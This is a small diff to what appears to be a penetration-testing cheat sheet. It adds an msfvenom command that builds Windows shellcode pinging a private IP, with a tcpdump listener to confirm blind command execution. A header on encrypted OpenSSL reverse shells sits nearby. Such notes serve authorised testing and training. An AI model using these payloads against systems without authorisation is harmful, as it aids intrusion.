@@ -24,7 +24,11 @@ ping -c 3 192.168.49.85
 
 sudo tcpdump -i any  ip proto icmp
 ```
-
+or create a payload with msfvenom:
+```
+msfvenom -f c -p windows/exec CMD="cmd.exe /C ping 192.168.0.135"
+tcpdump icmp -n -i wlan0
+```
 ### Encrypted Reverse Shells with OpenSSL
 
 Generate SSL certificate:
